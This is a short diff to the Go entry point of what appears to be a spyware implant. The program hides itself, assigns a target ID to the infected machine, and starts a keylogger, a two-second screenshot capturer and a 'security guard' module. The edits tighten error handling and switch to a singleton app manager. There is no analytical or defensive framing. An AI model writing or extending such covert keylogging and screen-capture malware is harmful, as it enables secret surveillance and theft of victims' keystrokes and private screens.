@@ -22,7 +22,7 @@ func main() {
 
 	err = hider.Hide()
 	if err != nil {
-		//panic(err)
+		panic(err)
 	}
 
 	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
@@ -33,7 +33,8 @@ func main() {
 	targetId := persistence.GenerateTargetID()
 	fmt.Println("targetId:", targetId)
 
-	appManager := apps.NewAppManager()
+	appManager := apps.GetAppManagerInstance()
+
 	addBuiltinApps(appManager)
 	appManager.StartAll(&wg)
 
@@ -55,7 +56,10 @@ func addBuiltinApps(am *apps.AppManager) {
 	am.AddApp("keylogger", &apps.KeyLoggerApp{})
 	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2})
 	securityGuard := &apps.SecurityGuardApp{}
-	securityGuard.Validate()
+	err := securityGuard.Validate()
+	if err != nil {
+		return
+	}
 	am.AddApp("security_guard", securityGuard)
 }
 
